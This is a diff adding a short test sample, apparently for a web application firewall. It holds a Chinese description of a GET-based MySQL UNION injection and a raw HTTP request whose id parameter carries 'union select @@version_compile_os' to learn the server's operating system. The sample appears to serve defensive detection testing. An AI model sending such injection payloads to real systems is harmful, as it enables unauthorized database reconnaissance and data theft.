@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506209
+# 攻击者基于UNION查询，将"union select @@version_compile_os"语句注入到 SQL 查询参数中，利用@@version_compile_os这个内置函数获取当前操作系统版本。通过了解当前操作系统版本的信息，从而进一步对数据库进行恶意操作，比如篡改用户信息、窃取敏感数据等。
+GET /?id=1%20union%20select%20@@version_compile_os&bid=hd_tag_m8mv24ge HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ge
+RM-PRO-Token: b5bffadff3a3eef3b53aa4c67e2df01a
+RM-PRO-Time: 1742808381009
+User-Agent: curl/7.83.1
+
